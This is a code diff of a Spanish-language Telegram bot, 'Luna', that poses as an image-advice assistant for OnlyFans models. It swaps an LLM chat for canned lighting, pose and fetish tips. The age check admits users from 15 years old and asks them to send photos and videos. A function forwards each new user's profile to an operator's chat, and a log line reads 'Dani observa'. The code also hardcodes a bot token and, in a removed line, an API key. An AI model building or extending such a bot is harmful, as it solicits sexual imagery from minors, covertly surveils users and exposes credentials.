@@ -3,22 +3,19 @@ import io
 import random
 import threading
 import asyncio
-import base64
 from datetime import datetime
 from flask import Flask
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from agewizard import Age
 from PIL import Image, ImageStat
-from groq import Groq
 from huggingface_hub import InferenceClient
 
 # --- CONFIGURACIÓN ---
 TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
 DANI_CHAT_ID = 8099004064 
-GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 
 
-client = Groq(api_key=GROQ_API_KEY)
+# Inicializamos Hugging Face (sin token, modelo público)
 hf_client = InferenceClient()
 
 # --- SERVIDOR WEB ---
@@ -42,7 +39,7 @@ perfiles = {}
 estilos_asignados = {}
 bot_pausado = False
 
-# --- RESPUESTAS Y CONSEJOS ---
+# --- RESPUESTAS Y CONSEJOS LOCALES ---
 MENSAJES_PROCESANDO = [
     "🔍 **Encendiendo visión artificial...**\nAnalizando cada píxel de tu foto. Dame unos segundos.",
     "🧠 **Procesando imagen...**\nMi IA está revisando la luz, el encuadre y tu expresión. Un momento.",
@@ -85,7 +82,7 @@ IDEAS_CONTENIDO = [
     "📸 Haz una sesión temática (enfermera, policía, profesora)."
 ]
 
-def analizar_foto_ia(imagen_bytes):
+def analizar_foto_huggingface(imagen_bytes):
     try:
         # 1. Descripción con Hugging Face
         descripcion = "una persona en una foto"
@@ -95,36 +92,14 @@ def analizar_foto_ia(imagen_bytes):
         except Exception as e:
             print(f"Error HF: {e}")
             
-        # 2. Consejo con Groq
-        try:
-            completion = client.chat.completions.create(
-                messages=[
-                    {"role": "system", "content": "Eres Luna, experta fotógrafa de adultos. Da 2 consejos sutiles sobre pose, luz o composición basados en la descripción. Sé profesional."},
-                    {"role": "user", "content": f"La IA de visión detectó: '{descripcion}'. Dame los consejos."}
-                ],
-                model="llama3-8b-8192",
-            )
-            consejo = completion.choices[0].message.content
-        except Exception as e:
-            print(f"Error Groq: {e}")
-            consejo = random.choice(CONSEJOS_LUZ) + "\n" + random.choice(CONSEJOS_POSE)
+        # 2. Consejos locales
+        consejo_luz = random.choice(CONSEJOS_LUZ)
+        consejo_pose = random.choice(CONSEJOS_POSE)
+        consejo_fetiche = random.choice(CONSEJOS_FETICHES) if random.random() < 0.3 else ""
             
-        return f"📸 **Lo que veo:** {descripcion.capitalize()}\n\n💡 **Mis consejos:**\n{consejo}"
+        return f"📸 **Lo que veo:** {descripcion.capitalize()}\n\n💡 **Consejos:**\n{consejo_luz}\n{consejo_pose}\n{consejo_fetiche}"
     except Exception as e:
         return "✨ **Nota técnica:** Iluminación perfecta.\n\n" + random.choice(CONSEJOS_LUZ) + "\n" + random.choice(CONSEJOS_POSE)
-
-async def conversar_ia(texto_usuario):
-    try:
-        completion = client.chat.completions.create(
-            messages=[
-                {"role": "system", "content": "Eres Luna, una asistente de imagen para modelos de OnlyFans. Hablas de forma natural, coqueta y profesional. Si te hablan de temas sexuales, responde con naturalidad y consejos sugerentes, sin ser vulgar. Responde breve."},
-                {"role": "user", "content": texto_usuario}
-            ],
-            model="llama3-8b-8192",
-        )
-        return completion.choices[0].message.content
-    except Exception as e:
-        return "Me distraje un momento... ¿de qué hablábamos?"
 
 async def enviar_expediente_inicial(context, user, edad, estilo):
     try:
@@ -158,12 +133,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in verified_users:
         mensaje_bienvenida = (
             "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen.\n\n"
-            "📸 Analizo tus fotos y converso contigo.\n"
+            "📸 Analizo tus fotos y te doy consejos.\n"
             "Para empezar, envíame tu fecha de nacimiento (DD-MM-AAAA):"
         )
         await update.message.reply_text(mensaje_bienvenida)
     else:
-        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o escríbeme.")
+        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o video.")
 
 async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado: return
@@ -171,9 +146,7 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     if user.id in verified_users:
-        await update.message.chat.send_action(action="typing")
-        respuesta = await conversar_ia(text)
-        return await update.message.reply_text(respuesta)
+        return await update.message.reply_text("Ya estás verificada. Envíame una foto o video.")
 
     try:
         person = Age(text, date_format="DD-MM-YYYY")
@@ -191,7 +164,7 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
             perfiles[user.id] = {"edad": edad, "estilo": estilo}
             estilos_asignados[user.id] = estilo
             
-            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o escribirme.")
+            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o videos.")
             await enviar_expediente_inicial(context, user, edad, estilo)
         else:
             await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango: 15 a 80.")
@@ -226,7 +199,7 @@ async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo_file = await update.message.photo[-1].get_file()
     photo_bytes = await photo_file.download_as_bytearray()
     
-    sugerencia = analizar_foto_ia(photo_bytes)
+    sugerencia = analizar_foto_huggingface(photo_bytes)
     
     puntos[user_id] = puntos.get(user_id, 0) + 10
     if puntos[user_id] >= 50 and niveles[user_id] == 1:
@@ -277,7 +250,7 @@ def main():
     app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
     app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
     
-    print("Luna IA en línea. Dani observa.")
+    print("Luna IA (Sin Groq) en línea. Dani observa.")
     app.run_polling()
 
 if __name__ == "__main__":
